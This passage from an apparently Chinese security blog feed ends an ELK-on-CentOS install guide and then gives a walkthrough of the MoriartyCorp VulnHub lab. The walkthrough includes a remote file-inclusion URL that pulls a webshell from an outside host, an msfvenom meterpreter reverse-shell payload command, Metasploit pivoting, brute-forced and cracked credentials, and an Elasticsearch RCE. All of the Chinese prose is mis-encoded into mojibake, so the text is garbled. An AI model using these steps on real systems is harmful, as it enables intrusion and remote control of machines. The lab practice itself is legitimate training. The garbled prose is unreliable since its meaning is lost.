src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504175014902.png" alt="image-20200504175014902"></p><ol start="5"><li>å¯åŠ¨</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl daemon-reload</span><br><span class="line">[root@localhost ~]# systemctl enable elasticsearch</span><br><span class="line">[root@localhost ~]# systemctl start elasticsearch</span><br><span class="line">[root@localhost ~]# netstat -plntu</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°9200ç«¯å£ï¼Œè¯æ˜å¯åŠ¨æˆåŠŸ</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504175254546.png" alt="image-20200504175254546"></p><h3 id="å®‰è£…Nginx"><a href="#å®‰è£…Nginx" class="headerlink" title="å®‰è£…Nginx"></a>å®‰è£…Nginx</h3><ol><li>å®‰è£…</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum install epel-release -y[root@localhost ~]# yum install nginx httpd-tools -y</span><br></pre></td></tr></table></figure><p>å®‰è£…Nginxä¹‹å‰è¦å…ˆå®‰è£…epelæº</p><ol start="2"><li>é…ç½®</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠä½äº36ã€59è¡Œä¹‹é—´çš„Serverå—åˆ æ‰ï¼Œæ›´å¤šçš„é…ç½®é¡¹åœ¨ /etc/nginx/conf.d/*.confä¸­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">36 include /etc/nginx/conf.d/*.conf;Server &#123; &#125;59# Settings for a TLS enabled server.</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504180031958.png" alt="image-20200504180031958"></p><h3 id="Kibannaæ·»åŠ ä»£ç†"><a href="#Kibannaæ·»åŠ ä»£ç†" class="headerlink" title="Kibannaæ·»åŠ ä»£ç†"></a>Kibannaæ·»åŠ ä»£ç†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/kibana.conf</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡ŒåŸŸåä¸º elk-stack.coï¼Œç„¶åä½¿ç”¨httpåè®®çš„basicè®¤è¯ï¼Œå¯†ç ç¨åæ·»åŠ ï¼Œç„¶åçœ‹locationå—ï¼Œå½“Nginxç›‘å¬åˆ°åŸŸåä¸ºelk-stack.coï¼Œç«¯å£ä¸º80çš„è¯·æ±‚æ—¶ï¼Œå°±ä¼šè½¬å‘ç»™æœ¬åœ°ç›‘å¬ç«¯å£5601çš„è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å°±æ˜¯kibanaï¼Œä¸‹ä¸€æ­¥å®‰è£…å®ƒï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;listen 80;server_name elk-stack.co;auth_basic &quot;Restricted Access&quot;;auth_basic_user_file /etc/nginx/.kibana-user;location / &#123;    proxy_pass http://localhost:5601;    proxy_http_version 1.1;    proxy_set_header Upgrade $http_upgrade;    proxy_set_header Connection &#x27;upgrade&#x27;;    proxy_set_header Host $host;    proxy_cache_bypass $http_upgrade;&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507221717828.png" alt="image-20200507221717828"></p><h3 id="Elasticsearchæ·»åŠ ä»£ç†"><a href="#Elasticsearchæ·»åŠ ä»£ç†" class="headerlink" title="Elasticsearchæ·»åŠ ä»£ç†"></a>Elasticsearchæ·»åŠ ä»£ç†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/elasticsearch.conf</span><br></pre></td></tr></table></figure><blockquote><p>å½“Nginxç›‘å¬åˆ°åŸŸåä¸ºelk-stack.coï¼Œç«¯å£ä¸º81çš„è¯·æ±‚æ—¶ï¼Œå°±ä¼šè½¬å‘ç»™æœ¬åœ°ç›‘å¬ç«¯å£9200çš„è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å°±æ˜¯Elasticsearch</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;listen 81;server_name elk-stack.co;location / &#123;    proxy_pass http://localhost:9200;    proxy_http_version 1.1;    proxy_set_header Upgrade $http_upgrade;    proxy_set_header Connection &#x27;upgrade&#x27;;    proxy_set_header Host $host;    proxy_cache_bypass $http_upgrade;&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507222435945.png" alt="image-20200507222435945"></p><h3 id="æ·»åŠ basicè®¤è¯"><a href="#æ·»åŠ basicè®¤è¯" class="headerlink" title="æ·»åŠ basicè®¤è¯"></a>æ·»åŠ basicè®¤è¯</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htpasswd -c /etc/nginx/.kibana-user admin</span><br></pre></td></tr></table></figure><blockquote><p>ç„¶åè¾“å…¥ä½ çš„å¯†ç ï¼Œè®°ä½æœ€åè¦é€šè¿‡è¿™ä¸ªæ¥ç™»å½•kibanaçš„</p></blockquote><h3 id="æµ‹è¯•Nginxé…ç½®"><a href="#æµ‹è¯•Nginxé…ç½®" class="headerlink" title="æµ‹è¯•Nginxé…ç½®"></a>æµ‹è¯•Nginxé…ç½®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure><p>å‡ºç°å¦‚ä¸‹è¯æ˜NginxæˆåŠŸ</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507223447583.png" alt="image-20200507223447583"></p><blockquote><p>å¦‚æœå‡ºç° test failedï¼Œå°±å›è¿‡å¤´æ£€æŸ¥/etc/nginx/conf.d/kibana.confå’Œ/etc/nginx/nginx.confè¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œè‚¯å®šæ˜¯ä¸å°å¿ƒå¼„é”™äº†ã€‚<br>å¦‚æœè¾“å‡º test is successfulï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯åŠ¨ nginx äº†</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable nginxsystemctl start nginx</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…Kibana"><a href="#å®‰è£…Kibana" class="headerlink" title="å®‰è£…Kibana"></a>å®‰è£…Kibana</h3><ol><li>ä¸‹è½½å¥½å¯¹åº”çš„rpmåŒ…</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh kibana-7.6.2-x86_64.rpm </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507225326794.png" alt="image-20200507225326794"></p><ol start="2"><li>ä¿®æ”¹Kibanaé…ç½®</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/kibana/kibana.yml</span><br></pre></td></tr></table></figure><ol start="3"><li>å–æ¶ˆ2ã€7ã€28è¡Œçš„æ³¨é‡Šï¼Œè¡Œå·ä¸ä¸€å®šå‡†ç¡®ï¼Œä½†ä¸€å®šæ˜¯ä¸‹é¢è¿™å‡ é¡¹ï¼ˆå„ä¸ªç‰ˆæœ¬è¡Œå·å¯èƒ½æœ‰å‡ºå…¥ï¼‰</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.port: 5601server.host: &quot;localhost&quot;elasticsearch.url: &quot;http://localhost:9200&quot;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507231907245.png" alt="image-20200507231907245"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507232332287.png" alt="image-20200507232332287"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507232609205.png" alt="image-20200507232609205"></p><ol start="4"><li>å¯åŠ¨Kibana</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable kibanasystemctl start kibananetstat -plntu</span><br></pre></td></tr></table></figure><p>å‡ºç°5601ç«¯å£ä»£è¡¨Kibanaå¯åŠ¨æˆåŠŸ</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507233100421.png" alt="image-20200507233100421"></p><h3 id="å®‰è£…Logstash"><a href="#å®‰è£…Logstash" class="headerlink" title="å®‰è£…Logstash"></a>å®‰è£…Logstash</h3><ol><li><p>ä¸‹è½½å¯¹åº”çš„rpmåŒ…</p></li><li><p>å®‰è£…</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh logstash-7.6.2.rpm</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507233242902.png" alt="image-20200507233242902"></p><ol start="3"><li>å¯åŠ¨</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable logstashsystemctl start logstash</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…æˆåŠŸ"><a href="#å®‰è£…æˆåŠŸ" class="headerlink" title="å®‰è£…æˆåŠŸ"></a>å®‰è£…æˆåŠŸ</h2><p>è®¿é—®å¯¹åº”ipçš„80ç«¯å£</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507233840411.png" alt="image-20200507233840411"></p><p>å¦‚éœ€ç”¨ä¸Šé¢çš„åŸŸåè®¿é—®ï¼Œæ·»åŠ ä¸€æ¡hostså°±è¡Œ</p><blockquote><p>åé¢ELKä¼˜åŒ–æ•¬è¯·æœŸå¾…ä¸‹ä¸€ç¯‡æ–‡ç« ~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åŸºäºCentoså¿«é€Ÿæ­å»ºELK&quot;&gt;&lt;a href=&quot;#åŸºäºCentoså¿«é€Ÿæ­å»ºELK&quot; class=&quot;headerlink&quot; title=&quot;åŸºäºCentoså¿«é€Ÿæ­å»ºELK&quot;&gt;&lt;/a&gt;åŸºäºCentoså¿«é€Ÿæ­å»ºELK&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;blockqu</summary>
      
    
    
    
    <category term="å®‰å…¨è¿è¥" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    
    <category term="ELK" scheme="http://example.com/tags/ELK/"/>
    
  </entry>
  
  <entry>
    <title>MoriartyCorpé¶åœºä¸€æ—¥æ¸¸</title>
    <link href="http://example.com/2020/05/03/MoriartyCorp%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%97%A5%E6%B8%B8/"/>
    <id>http://example.com/2020/05/03/MoriartyCorp%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%97%A5%E6%B8%B8/</id>
    <published>2020-05-03T06:35:02.000Z</published>
    <updated>2021-09-28T09:24:21.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Moriarty-Corpé¶åœºä¸€æ—¥æ¸¸"><a href="#Moriarty-Corpé¶åœºä¸€æ—¥æ¸¸" class="headerlink" title="Moriarty Corpé¶åœºä¸€æ—¥æ¸¸"></a>Moriarty Corpé¶åœºä¸€æ—¥æ¸¸</h1><h2 id="é¶åœºç®€ä»‹"><a href="#é¶åœºç®€ä»‹" class="headerlink" title="é¶åœºç®€ä»‹"></a>é¶åœºç®€ä»‹</h2><blockquote><p>Moriarty Corpé¶åœºç¯å¢ƒåŒ…å«ä¸€å°å¤–ç½‘æœåŠ¡å™¨å’Œä¸‰å°å†…ç½‘ä¸»æœºï¼Œæ”»å‡»è€…éœ€å…ˆå¯¹å¤–ç½‘æœåŠ¡å™¨è¿›è¡Œwebæ”»å‡»ï¼Œä¾æ®æäº¤flagåçš„æç¤ºä¿¡æ¯ï¼Œé€æ­¥è·å–å†…ç½‘ä¸»æœºæƒé™ã€‚æœ¬æ¬¡é¶åœºç¯å¢ƒåŒ…å«ä»¥ä¸‹10ä¸ªå…³é”®éƒ¨åˆ†ï¼š</p></blockquote><h2 id="é¶åœºæ”»ç•¥"><a href="#é¶åœºæ”»ç•¥" class="headerlink" title="é¶åœºæ”»ç•¥"></a>é¶åœºæ”»ç•¥</h2><blockquote><p>æ¨èé¶æœºä½¿ç”¨Virtualboxæ­å»ºï¼ˆæˆ‘æ˜¯ä¸ä¼šå‘Šè¯‰ä½ ä»¬æˆ‘VMwareç¿»è½¦äº†ï¼‰</p></blockquote><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><blockquote><p>åˆ©ç”¨Nmapè¿›è¡Œç®€å•çš„ç«¯å£æ¢æµ‹</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn -PR -T 4 192.168.1.0/24</span><br></pre></td></tr></table></figure><ul><li><p>-snï¼šåªè¿›è¡Œä¸»æœºå‘ç°ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æã€‚</p></li><li><p>-PRï¼šARP Pingã€‚</p></li><li><p>-Tï¼šæŒ‡å®šæ‰«æè¿‡ç¨‹ä½¿ç”¨çš„æ—¶åºï¼Œæ€»æœ‰6ä¸ªçº§åˆ«ï¼ˆ0-5ï¼‰ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œåœ¨ç½‘ç»œé€šè®¯çŠ¶å†µè¾ƒå¥½çš„æƒ…å†µä¸‹æ¨èä½¿ç”¨T4ã€‚</p></li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200501110334057.png" alt="image-20200501110334057"></p><p>è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨<code>arp -a</code></p><blockquote><p>æ ¹æ®é¶æœºè¯´æ˜ï¼Œå¼€å¯é¶æœºéœ€è¦å…ˆåœ¨é¶æœº8000ç«¯å£ä¸Šæäº¤<code>flag&#123;start&#125;</code>å¼€å¯é¶åœºç¯å¢ƒ</p></blockquote><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502104553594.png" alt="image-20200502104553594"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502110046688.png" alt="image-20200502110046688"></p><hr><h3 id="åˆæ­¥æ¢æµ‹"><a href="#åˆæ­¥æ¢æµ‹" class="headerlink" title="åˆæ­¥æ¢æµ‹"></a>åˆæ­¥æ¢æµ‹</h3><p>è®¿é—®é¶æœº80ç«¯å£ï¼Œå‘ˆç°ä»¥ä¸‹é¡µé¢</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502111050267.png" alt="image-20200502111050267"></p><p>è®¿é—®å…¶ä¸­ä¸¤ä¸ªåšå®¢é“¾æ¥ï¼Œè§‚å¯Ÿurlå¯å‘ç°å½¢å¼ä¸ºfile=xxx,çŒœæµ‹å¯èƒ½å­˜åœ¨è·¯å¾„éå†æˆ–è€…æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502111414684.png" alt="image-20200502111414684"></p><p>fuzzä¸­â€¦â€¦..</p><p>è¿˜fuzzä¸ªå±</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502113035237.png" alt="image-20200502113035237"></p><p>å°è¯•æ–‡ä»¶åŒ…å«</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115323304.png" alt="image-20200502115323304"></p><p>åŒ…å«webshellï¼Œé€šè¿‡èšå‰‘è¿æ¥ï¼Œè¿æ¥åœ°å€å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.3.53/?file=http://xx.xx.xx.xx/1.txt</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç¿»åƒåœ¾æ‰¾åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115720085.png" alt="image-20200502115720085"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115737818.png" alt="image-20200502115737818"></p><p>æäº¤flagè‡³8000ç«¯å£</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115831491.png" alt="image-20200502115831491"></p><p>çœ‹åˆ°æç¤ºç›®æ ‡å­˜åœ¨å†…ç½‘ä¿¡æ¯ï¼Œå†…ç½‘ipæ®µèŒƒå›´åœ¨172.17.0.3-254</p><hr><h3 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h3><p>æ€è·¯ï¼š å…ˆåˆ©ç”¨msfåå¼¹ä¸€ä¸ªä¼šè¯ï¼Œå»ºç«‹ä¸€ä¸ªå†…ç½‘é€šé“å†è¿›è¡Œä¸‹ä¸€æ­¥çš„ä¿¡æ¯æœé›†</p><ol><li>åˆ©ç”¨msfvenomç”Ÿæˆelfè¿›è¡Œåå¼¹shell</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><ol start="2"><li>å°†ç”Ÿæˆçš„elfæ–‡ä»¶ä¸Šä¼ è‡³ç›®æ ‡æœºå™¨ï¼Œç»™ä¸æ‰§è¡Œæƒé™æ‰§è¡Œ</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 shell</span><br><span class="line">.elf ./shell.elf</span><br></pre></td></tr></table></figure><ol start="3"><li>msfå¼€å¯ç›‘å¬åå¼¹Meterpreterä¼šè¯</li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502173732550.png" alt="image-20200502173732550"></p><p>æ ¹æ®ä¹‹å‰æç¤ºï¼ŒæŸ¥çœ‹å½“å‰ç½‘æ®µ</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502173806292.png" alt="image-20200502173806292"></p><p>åˆ©ç”¨msfå»ºç«‹è·¯ç”±</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 172.17.0.0/24 25</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503091444686.png" alt="image-20200503091444686"></p><p>åˆ©ç”¨Proxychainså·¥å…·é…ç½®socks5ä»£ç†</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502174330769.png" alt="image-20200502174330769"></p><p>ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ socks5ä»£ç†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502174521893.png" alt="image-20200502174521893"></p><hr><h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><p>åˆ©ç”¨ä¸Šé¢å»ºç«‹çš„ä»£ç†é€šé“é…åˆnmapè¿›è¡Œ172ç½‘æ®µçš„ç®€å•ä¿¡æ¯æœé›†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV -sT -Pn -T4 -p 80,8080,8000,443</span><br></pre></td></tr></table></figure><p>æ ¹æ®æ¢æµ‹ç»“æœï¼Œå‘ç°172.17.0.4å­˜åœ¨ä¸€ä¸ªwebæœåŠ¡</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503101038756.png" alt="image-20200503101038756"></p><p>è§‚å¯Ÿé¡µé¢ä¼¼ä¹æ˜¯ä¸ªä¸Šä¼ ç‚¹ï¼Œä½†å¥½åƒéœ€è¦è¾“å…¥ç›¸å…³å¯†ç ï¼ŒçŒœæµ‹å¯èƒ½æ€è·¯æ˜¯é€šè¿‡çˆ†ç ´è·å–å¯†ç å†ä¸Šä¼ webshell</p><p>burpå¼€æ</p><p>burpå…ˆé…ç½®msfç”Ÿæˆçš„socksä»£ç†</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503101405961.png" alt="image-20200503101405961"></p><p>ç®€å•çˆ†ç ´å¾—åˆ°å¯†ç æ˜¯<code>password</code>PS:è¿˜å¥½é¶æœºçš„å¯†ç ä¸æ˜¯å¤ªå¤æ‚</p><p>ç›´æ¥ä¸Šä¼ webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503103447619.png" alt="image-20200503103447619"></p><p>é…ç½®èšå‰‘ä»£ç†</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503103548809.png" alt="image-20200503103548809"></p><p>ç¿»åƒåœ¾ï¼Œæ‰¾åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503104345560.png" alt="image-20200503104345560"></p><p>æäº¤ç¬¬äºŒä¸ªflagè·å–è¿›ä¸€æ­¥æç¤º</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503113841670.png" alt="image-20200503113841670"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503113723408.png" alt="image-20200503113723408"></p><p>æ ¹æ®æç¤ºç»™å‡ºäº†ä¸€éƒ¨åˆ†hashï¼Œä¼¼ä¹æ˜¯è®©æˆ‘ä»¬ç ´è§£</p><p>hash ä¸¢åˆ°cmd5ï¼ŒæŸ¥å‡ºç»“æœ</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503113920835.png" alt="image-20200503113920835"></p><p>å›åˆ°åˆšå¼€å§‹ï¼Œåˆ©ç”¨nmapè¿›è¡Œ22ç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sV -sT  -Pn -p22 172.17.0.0/24</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç»“æœå¾—åˆ°<code>172.17.0.1</code>å’Œ<code>172.17.0.12</code>å¼€æ”¾äº†sshç«¯å£</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503131849066.png" alt="image-20200503131849066"></p><p>åˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„ä¿¡æ¯ï¼Œæ„å»ºå­—å…¸ï¼Œç»“åˆ<code>proxychains</code>å’Œ<code>hydra</code>è¿›è¡Œsshå¼±å£ä»¤çˆ†ç ´</p><p>çˆ†ç ´å¾—åˆ°å¼±å£ä»¤ï¼šç”¨æˆ·åï¼šrootï¼Œå¯†ç ï¼šweapons</p><p>åˆ©ç”¨ç¬¬ä¸‰æ–¹sshå·¥å…·MobaXtermé…ç½®ä»£ç†è¿›è¡Œè¿æ¥</p><p>MobaXtermä¸‹è½½åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mobaxterm.mobatek.net/</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿æ¥ç›®æ ‡æœºå™¨</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503132257957.png" alt="image-20200503132257957"></p><p>æŸ¥çœ‹flag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503133018026.png" alt="image-20200503133018026"></p><p>æäº¤flagè‡³ä¸»ç›®å½•å¾—åˆ°ä¸‹ä¸€æ­¥æç¤º</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503133118875.png" alt="image-20200503133118875"></p><p>æç¤ºæˆ‘ä»¬ç›®æ ‡ç½‘æ®µå­˜åœ¨ä¸€ä¸ªèŠå¤©æœåŠ¡å™¨ï¼Œå¹¶ç»™å‡ºç”¨æˆ·åå¯†ç buyer13/arms13ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ç™»å½•èŠå¤©æœåŠ¡å™¨</p><p>ç»§ç»­ç”¨kaliæ¢æµ‹ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p443,8000,8080,8888</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503133642932.png" alt="image-20200503133642932"></p><p>å‘ç°<code>172.17.0.13</code>å¼€æ”¾ç›®æ ‡ç«¯å£ï¼Œè¾“å…¥å¯†ç </p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503134949879.png" alt="image-20200503134949879"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503135059609.png" alt="image-20200503135059609"></p><p>è§‚å¯Ÿå¾—çŸ¥å­˜åœ¨ä¿®æ”¹å¯†ç åŠŸèƒ½ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140444139.png" alt="image-20200503140444139"></p><p>ä¿®æ”¹adminå¯†ç å¹¶æˆåŠŸç™»å½•æŸ¥çœ‹æ¶ˆæ¯</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140527481.png" alt="image-20200503140527481"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140513666.png" alt="image-20200503140513666"></p><p>æäº¤ç¬¬å››ä¸ªflagè‡³ä¸»é¢æ¿</p><p>flag{on_the_move}</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140650555.png" alt="image-20200503140650555"></p><p>æ ¹æ®æç¤ºçš„ä¿¡æ¯ï¼Œæœ‰ä¸ªElasticsearch</p><p>ElasticsearchæœåŠ¡é€šå¸¸æ˜¯è¿è¡Œåœ¨9200ç«¯å£ä¸Š</p><p>ç»§ç»­kaliæ¢æµ‹æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p9200</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140839525.png" alt="image-20200503140839525"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140926601.png" alt="image-20200503140926601"></p><p>å¾—çŸ¥ç‰ˆæœ¬ä¸º4.10.2</p><p>åˆ©ç”¨kaliè‡ªå¸¦çš„æ¼æ´æœå¯»åŠŸèƒ½</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141154254.png" alt="image-20200503141154254"></p><p>å‘ç°å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><p>æ”»å‡»æˆåŠŸ</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141401840.png" alt="image-20200503141401840"></p><p>è·å–æœ€åä¸€ä¸ªflag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141434877.png" alt="image-20200503141434877"></p><p>æäº¤</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141504208.png" alt="image-20200503141504208"></p><p>å¦‚ä¸Šæ‰€è¿°ï¼Œipå·²è¢«æ‹‰é»‘</p><h2 id="ä¸ªäººæ€»ç»“"><a href="#ä¸ªäººæ€»ç»“" class="headerlink" title="ä¸ªäººæ€»ç»“"></a>ä¸ªäººæ€»ç»“</h2><p>æ ¹æ®ä¹‹å‰çš„ä¿¡æ¯å¤§æ¦‚è·å–åˆ°ç›®æ ‡çš„æ‹“æ‰‘å›¾</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503142949188.png" alt="image-20200503142949188"></p><p>é‡åˆ°çš„å‘ï¼š</p><ul><li>burpä¸æ”¯æŒsocks4ä»£ç†ï¼Œkaliå»ºç«‹éš§é“æ—¶æ³¨æ„ï¼Œå¯ä»¥é‡‡ç”¨regç­‰å…¶ä»–ä»£ç†è„šæœ¬å»ºç«‹éš§é“</li></ul><h2 id="èµ„æºæ€»ç»“"><a href="#èµ„æºæ€»ç»“" class="headerlink" title="èµ„æºæ€»ç»“"></a>èµ„æºæ€»ç»“</h2><blockquote><ul><li><p>é¶åœºä¸‹è½½åœ°å€ï¼š</p><p>Download (Mirror):</p><p><a href="https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova">https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova</a></p><p>Download (Torrent):</p><p> <a 